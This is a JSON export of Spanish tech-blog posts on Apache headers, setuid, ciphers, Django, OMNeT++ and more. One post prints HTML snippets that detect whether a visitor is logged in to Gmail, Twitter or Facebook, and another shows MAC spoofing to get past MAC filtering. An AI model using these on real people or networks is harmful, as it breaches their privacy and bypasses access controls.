Header , y permite utilizar el valor de una cabecera en el request Este es el resultado: bash $ curl -I localhost bash HTTP/1.1 200 OK Date: Mon, 28 Feb 2011 18:01:45 GMT Server: Apache/2.2.14 (Ubuntu) X-Powered-By: PHP/5.3.2-1ubuntu4.7 X-MyHeader: It took D=632 microsecons to serve this page. Vary: Accept-Encoding Content-Type: text/html Hay algunas páginas web que incluyen cabeceras no estándar , como la mostrada arriba, tales como: bash $ curl -I http://ww.barrapunto.com ... X-Bender: Hey Fry, I'm steering with my ass! bash $ curl -I wordpress.com ... X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header. X-nananana: Batcache Actualizado el 10 de febrero de 2015 Una cabecera que nos puede resultar interesante añadir es la de X-Robots-Tag , por ejemplo para evitar que los buscadores indexen el contenido del fichero robots.txt : ```bash Header set X-Robots-Tag \"noindex\" ``` En esta página, podemos encontrar las especificaciones de esta cabecera .","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/02/28/cabeceras-http-personalizadas-en-apache2/","loc":"https://karpoke.ignaciocano.com/2011/02/28/cabeceras-http-personalizadas-en-apache2/"},{"title":"setuid y setgid","text":"setuid y setgid son unos permisos especiales, también llamados los sticky bits , que se les pueden asignar a los programas ejecutables para que se ejecuten con los permisos del propietario y no del usuario que los ejecuta. Esto sirve para, por ejemplo, que cualquier usuario ejecute el comando ping aunque éste necesite privilegios de administrador, que es el propietario. En GNU/Linux, y en Unix, estos bits se ignoran cuando se aplican a directorios. Ejecutar un comando como si fuésemos otro usuario, especialmente como si fuésemos el administrador, suena peligroso... para el administrador. El problema viene porque si uno de éstos programas sufre un buffer overflow , el usuario podría ejecutar código arbitrario con privilegios de administrador. Para cambiar estos permisos con chmod debemos utilizar el byte alto . El valor en octal que debemos usar es 4 para el setuid y 2 para el setgid . Si queremos poner los dos utilizaremos el 6. Por ejemplo, activar el setuid (4) y darle permisos de ejecución, lectura y escritura para el propietario (7), y sólo de lectura para el grupo y el resto (4) sería: bash $ chmod 4744 myelf Si sólo quisiéramos cambiarle los permisos a un archivo para que tenga alguno de estos bits activados: bash $ chmod u+s myelf $ chmod g+s myelf $ chmod ug+s myelf Para quitárselos: bash $ chmod u-s myelf $ chmod g-s myelf $ chmod ug-s myelf Para mostrar los archivos con setuid o setgid que hay en el sistema, accesibles para el usuario con el que estamos, evitando mostrar los avisos de que no tenemos permisos de entrar en según qué direcctorios, ejecutamos: bash $ find / -type f \\( -perm -4000 -o -perm -2000 \\) -print 2>/dev/null 1>stickybit.txt & $ tail -f stickybit.txt bash /bin/mount /bin/fusermount /bin/su /bin/umount /bin/ping6 /bin/ping ... En la Wikipedia podemos ver un pequeño programa en C que nos muestra esta diferencia entre el uid del usuario y del propietario: ```c include include include int main(void) { printf( \"Real UID = %d\\n\" \"Effective UID = %d\\n\" \"Real GID = %d\\n\" \"Effective GID = %d\\n\", getuid (), geteuid(), getgid (), getegid() ); return 0; } ``` Vamos a probarlo. El código de este programa está en el archivo printid.c : bash $ id -u 1000 $ sudo id -u 0 $ sudo gcc -Wall printid.c -o printid $ sudo chmod ug+s printid $ ls -l printid -rwsr-sr-x 1 root root 7249 2011-02-28 13:17 printid $ ./printid Real UID = 1000 Effective UID = 0 Real GID = 1000 Effective GID = 0","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/02/28/setuid-y-setgid/","loc":"https://karpoke.ignaciocano.com/2011/02/28/setuid-y-setgid/"},{"title":"html2pdf = html2ps + ps2pdf","text":"Un buen comando para convertir una web a PDF , idóneo para sitios con documentación pero que ésta sólo está disponible online . Por ejemplo: bash $ html2ps -W b http://www.vala-project.org/doc/vala/ | ps2pdf - out.pdf Con la opción -W b le decimos a html2ps que siga sólo los enlaces que están en el mismo directorio, o a partir de él, respecto a la ruta proporcionada. Fuente: techpin.com Podemos crear un alias que reciba dos parámetros, la URL y el nombre que queremos ponerle al PDF: bash $ alias html2pdf='fhtml2pdf() { html2ps -W a \"$1\" | ps2pdf - \"$2\"; }; fhtml2pdf' $ html2pdf http://www.vala-project.org/doc/vala/ vala-doc.pdf","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/02/28/html2pdf-html2ps-ps2pdf/","loc":"https://karpoke.ignaciocano.com/2011/02/28/html2pdf-html2ps-ps2pdf/"},{"title":"Mystery","text":"Casi parece que está escrito en chino, o mejor dicho en brainfuck , o puede que no sea muy zen , pero no deja de ser elegante . ```python def mystery(n): a = list(range(n)) [[(yield i) for a[::i] in [([0]*n)[::i]]] for i in a[2:] if a[i]] ``` El nombre de la función pretende no dar pistas para que intentemos averiguar qué hace exactamente esta función. He aquí una pista: Fuente: numberspiral.com ```python f = mystery(20) try: ... while True: ... print f.next() ... except StopIteration: ... pass 2 3 5 7 11 13 17 19 ```","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/02/26/mystery/","loc":"https://karpoke.ignaciocano.com/2011/02/26/mystery/"},{"title":"Python Zen","text":"Just to keep in mind... Author: euart __ ```python import this The Zen of Python, by Tim Peters Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than right now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those! ```","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/02/26/python-zen/","loc":"https://karpoke.ignaciocano.com/2011/02/26/python-zen/"},{"title":"Abusando del código de estado HTTP","text":"function logged_in(id, txt) { document.getElementById(id).innerHTML = txt; } En el artículo original, de Mark Cardwell , se muestra como podemos saber si un visitante de nuestra página está conectado a diferentes servicios, como GMail, Facebook, Twitter, etc, aprovechando las diferencias de comportamiento que muestran estos servicios al acceder a enlaces concretos si el usuario está conectado o no. GMail Conectado a GMail? ... Para comprobar si el visitante está conectado a GMail se intenta cargar una imagen de la siguiente manera: html <img src=\"https://mail.google.com/mail/photos/static/AD34hIhNx1pdsCxEpo6LavSR8dYSmSi0KTM1pGxAjRio47pofmE9RH7bxPwelO8tlvpX3sbYkNfXT7HDAZJM_uf5qU2cvDJzlAWxu7-jaBPbDXAjVL8YGpI\" onload=\"logged_in_gmail()\" onerror=\"not_logged_in_gmail()\" /> El src de la imagen hace referencia a la imagen del perfil de Mark, si no hemos iniciado sesión en GMail, la dirección del src no devolverá una imagen, sino que redireccionará a una página HTML. Con los atributos onload y onerror podremos distinguir si la imagen ha cargado o no, por lo que podremos saber si el usuario ha iniciado sesión o no. Esto parece que funciona en Firefox, Chrome, Opera, Safari y varias versiones de Internet Explorer. Parece que si en Firefox tenemos desmarcada la opción de \"Aceptar cookies de terceros\", este ataque ya no funciona. Para comprobar el estado de esta opción vamos al menú Editar > Preferencias > Privacidad Usar configuración personalizada para el historial. Twitter Conectado a Twitter? ... En el caso de Twitter, se utiliza una etiqueta script , por lo que el usuario deberá tener el Javascript habilitado para que funcione. En este caso, el src hace referencia a una página sólo visible si el usuario está conectado. En caso contrario, se produce una redirección. Aquí es donde entran los diferentes códigos de estado de HTTP. Facebook, Twitter o Digg proporcionan diferentes código de estado para algunas URLs dependiendo de si el usuario está conectado o no. En Firefox, Safari y Chrome, la etiqueta script ejecuta el onload si el src devuelve un 200 OK , incluso si el contenido devuelto no es código Javascript. Si el código es 404, 403, 406 o 500, se ejecuta el onerror . html <script type=\"text/javascript\" src=\"https://twitter.com/settings/accounts/update?authenticity_token=xxx\" onload=\"not_logged_in_twitter()\" onerror=\"logged_in_twitter()\" async=\"async\"> </script> En este caso, Twitter redirige a la página de login si el usuario no está conectado, pero devuelve una página de error si el usuario está conectado, ya que la URL que hemos puesto corresponde a un formulario que debe ser enviado por POST y no por GET , además de que no conocemos el valor del campo authenticity_token . Si Twitter está bloqueado y nos conectamos desde detrás de un proxy, es posible que el script nos diga que estamos conectados cuando en realidad no es así. Facebook Conectado a Facebook? ... En el caso de Facebook también recuriremos a una etiqueta script , y en el src podemos poner la URL de un perfil que sólo sea visible si el usuario está conectado, por ejemplo el de Mike. ```html <script type=\"text/javascript\" src=\"https://www.facebook.com/imike3\" onload=\"logged_in_to_facebook()\" onerror=\"not_logged_in_to_facebook()\" async=\"async\" ``` En algunas ocasiones, parece que Facebook añade algún tipo de comprobación de seguridad , como añadir un captcha , antes de mostrar el perfil, o el error en caso de no estar conectado, por lo que el código de esa página previa es un 200 OK , y mostraría al usuario conectado cuando en realidad puede no ser así. En los comentarios del artículo de Mike hacen referencia a un artículo anterior de Jeremiah Grossman . Utiliza la misma técnica de la etiqueta img sólo que la imagen a la que hace referencia no es una imagen del perfil, sino una imagen que debía estar accesible una vez iniciada la sesión. Sin embargo, esa imagen ahora mismo no está disponible. Una cosa que me ha llamado la atención es que hay un ejemplo de cómo podemos crear un ataque más personalizado. Si hay una persona que sabemos que va a visitar la web, podemos comprobar si ha iniciado sesión en el panel de administración de Wordpress que sabemos que tiene instalado en algún dominio concreto: html <img src=\"http://www.example.org/wp-admin/images/toggle.gif\" onload=\"alert('Logged-In')\" onerror=\"alert('Not Logged-in')\" /> /> Aunque ya no funciona, ya que esa imagen ya no existe, y el resto de imágenes utilizadas en el administrador pueden ser visualizadas sin tener que haber iniciado sesión. Para protegernos de estos ataques contra nuestra privacidad podemos utilizar extensiones como NoScript o RequestPolicy .","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/02/22/abusando-del-codigo-de-estado-http/","loc":"https://karpoke.ignaciocano.com/2011/02/22/abusando-del-codigo-de-estado-http/"},{"title":"Solucionado el error \"Tcl/Tk not found\" al instalar OMNeT++ en Ubuntu","text":"OMNeT++ es un entorno de desarrollo modular y extensible desarrollado en C++, y gratuito pasa uso no comercial, especialmente pensado para construir simuladores de redes de eventos discretos en el sentido más amplio: redes de comunicaciones alámbricas, inalámbricas, redes de colas, etc. El soporte para dominios específicos tales como redes de sensores, redes inalámbricas ad-hoc , protocolos de Internet, modelado del rendimiento, etc, viene dado por proyectos desarrollados de forma independiente. OMNeT++ ofrece un IDE basado en eclipse, un entorno de ejecución gráfico y otras herramientas. Hay extensiones para simulación en tiempo real, emulación de redes, lenguages de programación alternativos (Java, C#), integración con bases de datos, etc. Para instalarlo en Ubuntu, nos bajamos el código fuente y lo descomprimimos, por ejemplo, en nuestro directorio personal: bash $ tar xvfz 2217-omnet-41-source--ide-tgz -C ~ Instalamos los paquetes necesarios: bash $ sudo aptitude install build-essential gcc g++ bison flex perl tcl-dev tk-dev blt libxml2-dev zlib1g-dev openjdk-6-jre doxygen graphviz openmpi-bin libopenmpi-dev libpcap-dev Ejecutamos las siguientes líneas y también las añadimos a nuestro ~/.bashrc : ```bash omnet++4.1 export PATH= \\(PATH:\\) HOME/omnetpp-4.1/bin export TCL_LIBRARY=/usr/share/tcltk/tcl8.4 ``` Ya podemos proceder con la instalación: bash $ ./configure Si al ejecutar este comando termina con el siguiente error: bash checking for Tcl/Tk with CFLAGS=\"-I/usr/include/tcl8.4 -fwritable-strings\" LIBS=\"-L/usr/share/tcltk -ltk8.4 -ltcl8.4\"... no configure: error: Tcl/Tk not found, needed for all GUI parts. Version 8.4.0+ and devel package required. Check config.log for more info! se debe a que no encuentra las librerías Tcl/Tk. Para solucionarlo, deberemos modificar el archivo de configuración ~/omnet-4.1/configure.user para que las encuentre. La solución del manual de instalación no me ha ido del todo bien dado que las librerías Tcl/Tk en Ubuntu no se encuentran por defecto donde el programa espera. Así que editamos ese fichero, y allí donde nos sugiere que modifiquemos estas variables, añadimos las siguientes líneas: bash TK_CFLAGS=\"-I/usr/include/tcl8.4 -I/usr/include/tk8.4\" TK_LIBS=\"-L/usr/share/tcltk/tcl8.4 -L/usr/share/tcltk/tk8.4 -ltk8.4 -ltcl8.4\" Actualizado el 20 de junio de 2012 La variable TK_CFLAGS debe contener los directorios donde se encuentran los ficheros tcl.h y tk.h . Si se encuentran en directorios distintos, se debe incluir ambos, precedidos del argumento -I . La variable TK_LIBS debe contener los directorios donde se encuentran las librerías cuyo nombre comienza por libtcl y libtk , por ejemplo, libtcl84.so , libtk8.4.a , etc. El argumento -l contiene el nombre de las librerías (que debe coincidir con el nombre de los ficheros anteriores, quitan el prefijo lib y los sufijos .so y .a ). Podría ser necesario enlazar con las librerías X11 , por lo que se debería añadir -lX11 , aunque esto último no me hizo falta. Ahora ya podemos ejecutar el comando: bash $ ./configure Y compilar con el make , pero aprovechando que tengo un procesador con dos núcleos y que el programa puede optimizarse para el número de núcleos, le pasaremos el argumento -j : bash $ make -j2 Si modificamos algún parámetro de configure.user , deberemos hacer una limpieza y volver a compilar: bash $ make cleanall $ make -j2 Si queremos ejecutar el programa sin entorno gráfico, por ejemplo, si lo vamos a utilizar a través de una sesión remota por ssh , y queremos decirle que que no tenga en cuenta las librerías Tcl/Tk a la hora de compilar, usaremos el siguiente comando: bash $ NO_TCL=yes ./configure Podemos ver y probar algunos de los ejemplos que trae el programa ejecutando: bash $ ~/omnetpp-4.1/samples/rundemo \"OMNeT++\" \"manual de instalación de omnet++\" if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/02/21/solucionado-el-error-tcltk-not-found-al-instalar-omnet-en-ubuntu/","loc":"https://karpoke.ignaciocano.com/2011/02/21/solucionado-el-error-tcltk-not-found-al-instalar-omnet-en-ubuntu/"},{"title":"Cambiar la contraseña de administrador en Django 1.2","text":"A partir de Django 1.2 se ha añadido el comando manage.py changepassword . python $ ./manage.py changepassword ['username'] Si no proporcionamos un nombre de usuario se intentará cambiar el nombre de usuario que concuerde con el del usuario que ha iniciado sesión. Este comando nos ahorra escribir lo siguiente: ```python from django.contrib.auth.models import User u = User.objects.get(username__exact='john') u.set_password('new password') u.save() ``` El usuario administrador es el primer usuario del sistema por lo que podemos escribir: ```python from django.contrib.auth.models import User u = User.objects.get(pk=1) u.is_superuser True u.username 'bofh' u.set_password('new password') u.save() ``` Es importante usar set_password y no asignar la contraseña directamente, ya que la contraseña se guarda con un formato que set_password , y también check_password , gestiona correctamente. La contraseña se guarda junto con el tipo de hash y la sal , una cadena aleatoria utilizada junto con la contraseña para crear el hash . Por ejemplo, sha1$a1976$a36cc8cbf81742a8fb52e221aaeab48ed7f58ab4","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/02/16/cambiar-la-contrasena-de-administrador-en-django-1-2/","loc":"https://karpoke.ignaciocano.com/2011/02/16/cambiar-la-contrasena-de-administrador-en-django-1-2/"},{"title":"Descifrando al César en Bash","text":"Después de ver cómo se descifra al César en Python , me he encontrado con un par de maneras elegantes de hacerlo desde Bash. Cifrado César Con tr : bash $ echo \"lorem ipsum dolor sit amet\" | tr 'a-z' 'd-za-c' oruhp lsvxp groru vlw dphw $ echo \"oruhp lsvxp groru vlw dphw\" | tr 'd-za-c' 'a-z' lorem ipsum dolor sit amet Con sed también se puede conseguir, aunque es bastante más laborioso: bash $ echo \"lorem ipsum dolor sit amet\" | sed -e \"y/abcdefghijklmnopqrstuvwxyz/defghijklmnopqrstuvwxyzabc/\" oruhp lsvxp groru vlw dphw $ echo \"oruhp lsvxp groru vlw dphw\" | sed -e \"y/abcdefghijklmnopqrstuvwxyz/defghijklmnopqrstuvwxyzabc/\" lorem ipsum dolor sit amet ROT13 Con tr : bash $ echo \"lorem ipsum dolor sit amet\" | tr 'a-zA-Z' 'n-za-mN-ZA-M' yberz vcfhz qbybe fvg nzrg $ echo \"yberz vcfhz qbybe fvg nzrg\" | tr 'n-za-mN-ZA-M' 'a-zA-Z' lorem ipsum dolor sit amet Por supuesto, con rot13 , incluido en el paquete bsdgames : bash $ rot13 \"lorem ipsum dolor sit amet\" yberz vcfhz qbybe fvg nzrg $ rot13 \"yberz vcfhz qbybe fvg nzrg\" lorem ipsum dolor sit amet ROT47 Con tr : bash $ echo \"lorem ipsum dolor sit amet\" | tr '!-~' 'P-~!-O' =@C6> :ADF> 5@=@C D:E 2>6E $ echo \"=@C6> :ADF> 5@=@C D:E 2>6E\" | tr 'P-~!-O' '!-~' lorem ipsum dolor sit amet","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/02/16/descifrando-al-cesar-en-bash/","loc":"https://karpoke.ignaciocano.com/2011/02/16/descifrando-al-cesar-en-bash/"},{"title":"Descifrando al César en Python","text":"Si lo que pretendemos es, dada una cadena, sustituir una serie de caracteres por otra, en Python es tan sencillo como pasarle al método maketrans una cadena con los caracteres que queremos cambiar y otra con los caracteres a utilizar en su lugar. Ambas cadenas deberán tener la misma longitud. Este método devuelve una tabla de traducción, un objeto susceptible de ser usado por el método translate el cual se aplica sobre un string , como veremos. Cifrado César En pocas palabras, el cifrado César se basa en sustituir cada letra de un mensaje, una cadena de texto, por la que le sigue 3 puestos más allá en el alfabeto, es decir, la A por la D, la B por la E, y así sucesivamente, hasta las tres últimas letras que se cambiarán por las tres primeras letras, respectivamente. Para descifrar un mensaje cifrado con este sistema sólo tenemos que llevar a cabo el proceso inverso, cambiar la A por la X, la B por la Y, la C por la Z, y a partir de la D por la letra 3 puestos antes en el alfabeto. No tiene en cuenta mayúsculas o minúsculas, por lo que por ahora no nos preocuparemos de eso. ```python from string import maketrans sfrom = \"abcdefghijklmnopqrstuvwxyz\" sto = \"xyzabcdefghijklmnopqrstuvw\" trantab = maketrans(sfrom, sto) \"sbwkrq\".translate(trantab) ``` Con esto en mente, podemos escribir un método que nos permita cualquier tipo de traslación, tanto en un sentido como en otro: python from string import maketrans, translate, ascii_lowercase as al def caesar(text, offset=3): return translate(text, maketrans(al, al[offset:] + al[:offset])) ```python caesar(\"python\") 'sbwkrq' caesar(\"sbwkrq\", -3) 'python' caesar(\"python\", 13) 'clguba' ``` Los métodos de cifrado basados en traslaciones hace mucho tiempo que quedaron obsoletos, ya que es sencillo obtener una distribución de las frecuencias de letras de un texto cifrado y compararlas con la frecuencia de aparición de letras para un idioma concreto. ROT13 RTO13 está basado en el cifrado César, sólo que en lugar de 3 posiciones, hace la sustitución por el carácter que está 13 puestos hacia adelante en el alfabeto, conservando, además, si es mayúscula o minúscula. python from string import maketrans, translate, ascii_lowercase as al, ascii_uppercase as au def rot13(text, offset=13): sfrom = au + al sto = au[offset:] + au[:offset] + al[offset:] + al[:offset] return translate(text, maketrans(sfrom, sto)) ```python rot13(\"ABCXYZabcxyz\") 'NOPKLMnopklm' ``` ROT47 Este es un ROT13 que utiliza un conjunto mayor que el de las letras, ya que utiliza el conjunto de los caracteres ASCII del \"!\" (33) al \"\\~\" (126), y realiza la sustitución por el carácter que está 47 puestos hacia adelante. Crearemos la lista de caracteres ASCII necesarios a partir de las listas de caracteres del módulo string . Para conseguirlo, buscaremos los índices de los caracteres de puntuación entre los cuales insertaremos las listas de dígitos y letras mayúsculas y minúsculas. Este es el código ASCII: ```bash 30 40 50 60 70 80 90 100 110 120 0: ( 2 < F P Z d n x 1: ) 3 = G Q [ e o y 2: * 4 > H R \\ f p z 3: ! + 5 ? I S ] g q { 4: \" , 6 @ J T &#94; h r | 5: # - 7 A K U _ i s } 6: $ . 8 B L V ` j t ~ 7: % / 9 C M W a k u DEL 8: & 0 : D N X b l v 9: ;' 1 ; E O Y c m w ``` Y este es el contenido de la lista de signos de puntuación: ```python string.punctuation '!\"#$%&\\'()*+,-./:;< =>?@[\\]&#94;_`{|}~' ``` Debemos colocar los números entre \"/\" y \":\", las letras mayúsculas entre \"@\" y \"[\", y las letras minúsculas entre \"`\" y \"{\": ```python from string import punctuation as p, digits as d, ascii_lowercase as al, ascii_uppercase as au ix = p.find(\":\") iu = p.find(\"[\") il = p.find(\"{\") ascii = p[:ix] + d + p[ix:iu] + au + p[iu:il] + al + p[il:] ``` ```python print ascii '!\"#$%&\\'()*+,-./0123456789:;< =>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]&#94;_`abcdefghijklmnopqrstuvwxyz{|}~' len(ascii) 94 ``` Ya podemos crear una función rot47 : python from string import maketrans, translate def rot47(text, offset=47): # ascii contiene los caracteres ASCII del \"!\" (33) al \"~\" (126) return translate(text, maketrans(ascii, ascii[offset:] + ascii[:offset])) ```python print rot47(\"Cómo se puede distinguir a un extrovertido de un\") ró>@ D6 AF656 5:DE:?8F:C 2 F? 6IEC@G6CE:5@ 56 F? ``` Vigenëre Vigenëre es un cifrado César por grupos, donde cada letra del grupo sufre una traslación diferente. La longitud de la palabra clave determina el tamaño de los grupos, y cada letra especifica la traslación para cada letra del grupo. No distingue entre mayúsculas y minúsculas. python from string import ascii_lowercase as al def vigenere_crypt(text, key, decrypt=0): prefix = -1 if decrypt else 1 len_t = len(text) len_k = len(key) ak = [ al.find(c) for c in key ] return \"\".join([caesar(text[i], prefix*ak[i%len_k]) for i in range(len_t)]) ```python vigenere_crypt(\"parisvautbienunemesse\", \"loup\") 'aolxdjujepctyihtxsmhp' ``` ```python vigenere_crypt(\"aolxdjujepctyihtxsmhp\", \"loup\", -1) 'parisvautbienunemesse' ``` Este cifrado también quedó obsoleto después de que se descubriera el método Kasiski , que consiste en buscar palabras repetidas en el texto cifrado. Es casi seguro que dichas palabras no sólo eran la misma antes del cifrado sino que además la clave coincidió en la misma posición en ambas ocurrencias. La distancia entre palabras repetidas es múltiplo de la longitud de la clave, por lo que si tenemos diferentes palabras que se repiten, obtenemos el máximo común divisor de las longitudes y la longitud de la clave debe ser, o dicho mcd, o un factor primo de éste. Una vez encontrada la longitud de la clave, se aplica la misma técnica estadística que para el cifrado César.","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/02/16/descifrando-al-cesar-en-python/","loc":"https://karpoke.ignaciocano.com/2011/02/16/descifrando-al-cesar-en-python/"},{"title":"Cambiar la dirección MAC","text":"A veces, nos puede interesar cambiar la MAC de nuestra tarjeta de red, ya sea porqué nos conectamos a una red en la que no queremos que quede registrada nuestra MAC real (todavía se podría ser más paranoico), ya sea porqué hay un filtrado por MAC y la nuestra no se encuentra en la lista de las MAC autorizadas para conectarse. Fuente: wikipedia Para conocer la MAC de nuestras interfaces de red: bash $ ifconfig | grep -E \"([0-9a-f]{2}:){5}[0-9a-f]{2}\" eth0 Link encap:Ethernet direcciónHW 00:3c:72:26:3a:22 eth2 Link encap:Ethernet direcciónHW 00:50:cb:d9:07:79 Para cambiar la MAC de la interfaz eth0 , por ejemplo: bash $ sudo ifconfig eth0 down $ sudo ifconfig eth0 hw ether 00:00:de:ad:de:ad $ sudo ifconfig eth0 up En principio, podemos asignar la dirección MAC que queramos, mientras sean números hexadecimales , con la salvedad de que, posiblemente, necesitaremos que tenga un identificador válido . Aún así, podríamos asignar una MAC aleatoria : bash $ echo $(cat /proc/interrupts | md5sum | sed -r 's/&#94;(.{10}).*$/00\\1/; s/([0-9a-f]{2})/\\1:/g; s/:$//;') 00:19:a9:58:2b:14 Actualizado el 22 de julio de 2014 Utilizando el comando ip , el cual vino a sustituir a ifconfig , también podemos consultar las interfaces de red: bash $ ip addr show $ ip link show Y cambiar la dirección MAC de la que nos interese: bash $ sudo ip link set dev wlan1 down $ sudo ip link set dev wlan1 address 00:19:a9:58:2b:14 $ sudo ip link set dev wlan1 up gnu mac changer macchanger es un programa que nos permite cambiar la MAC de varias maneras. Por ejemplo: Poner la MAC que queramos, de la misma manera que el comando anterior: bash $ sudo macchanger -m 00:50:cb:d9:07:79 eth2 Cambiar la MAC sin cambiar la información del vendedor, es decir, los tres primeros bytes: bash $ sudo macchanger -e eth2 Current MAC: 00:50:cb:b4:98:16 (Jetter) De manera aleatoria: bash $ sudo macchanger -r Mostrar un listado de vendedores: bash $ macchanger -l Filtrado de MAC Si lo que queremos es usar una MAC autorizada para poder conectarnos, dependerá de si la conexión es por cable o no. Si es por cable y tenemos acceso a una consola, simplemente obtenemos la MAC como hemos visto y enchufamos el cable de red. Si fuese un ordenador con Windows, podemos obtener la MAC a través de las propiedades de la interfaz de red en el administrador de redes del panel de control, o ejecutando en una consola: bash C:> ipconfig /all Si es una conexión inalámbrica, podemos obtener alguna MAC válida de algún equipo que esté conectado a la red, utilizando algún programa como kismet .","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/02/09/cambiar-la-direccion-mac/","loc":"https://karpoke.ignaciocano.com/2011/02/09/cambiar-la-direccion-mac/"},{"title":"32 ó 64 bits","text":"Para saber si el procesador es de 64 bits, ejecutamos el siguiente comando: bash $ grep flags /proc/cpuinfo | grep -Eo \" lm \" && echo \"64\" || echo \"32\" 32 Otro comando que nos dirá si la arquitectura es de 32 ó 64 bits es lshw : bash $ sudo lshw -C CPU | grep width width: 32 bits Para saber si el sistema operativo es de 32 ó 64 bits ejecutamos el siguiente comando: bash $ getconf LONG_BIT 32 bash $ uname -m i686 bash $ arch # es lo mismo que la anterior i6868 Otro comando útil es dpkg-architecture : bash $ dpkg-architecture DEB_BUILD_ARCH=i386 DEB_BUILD_ARCH_BITS=32 DEB_BUILD_ARCH_CPU=i386 DEB_BUILD_ARCH_ENDIAN=little DEB_BUILD_ARCH_OS=linux DEB_BUILD_GNU_CPU=i686 DEB_BUILD_GNU_SYSTEM=linux-gnu DEB_BUILD_GNU_TYPE=i686-linux-gnu DEB_BUILD_MULTIARCH=i386-linux-gnu DEB_HOST_ARCH=i386 DEB_HOST_ARCH_BITS=32 DEB_HOST_ARCH_CPU=i386 DEB_HOST_ARCH_ENDIAN=little DEB_HOST_ARCH_OS=linux DEB_HOST_GNU_CPU=i686 DEB_HOST_GNU_SYSTEM=linux-gnu DEB_HOST_GNU_TYPE=i686-linux-gnu DEB_HOST_MULTIARCH=i386-linux-gnu","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/01/18/32-o-64-bits/","loc":"https://karpoke.ignaciocano.com/2011/01/18/32-o-64-bits/"},{"title":"SWI-Prolog conoce el sentido de la vida, del universo y de todo lo demas","text":"Ejecutamos swipl , uno de los compiladores de Prolog libres: bash $ swipl Y si le interrogamos por el valor de una variable de la cual no puede inferir ningún valor... ```prolog % library(swi_hooks) compiled into pce_swi_hooks 0.00 sec, 2,060 bytes Welcome to SWI-Prolog (Multi-threaded, 32 bits, Version 5.8.2) Copyright (c) 1990-2009 University of Amsterdam. SWI-Prolog comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions. Please visit http://www.swi-prolog.org for details. For help, use ?- help(Topic). or ?- apropos(Word). ?- K. % ... 1,000,000 ............ 10,000,000 years later % % >> 42 << (last release gives the question) ```","tags":"memo","url":"https://karpoke.ignaciocano.com/2011/01/18/swi-prolog-conoce-el-sentido-de-la-vida-del-universo-y-de-todo-lo-demas/","loc":"https://karpoke.ignaciocano.com/2011/01/18/swi-prolog-conoce-el-sentido-de-la-vida-del-universo-y-de-todo-lo-demas/"},{"title":"Personalizando el arranque gráfico en Ubuntu Maverirk Meerkat","text":"Tras arreglar un par de problemas que tenía con el arranque , ya que estamos, vamos a darle un toque distinto al asunto. Temas de 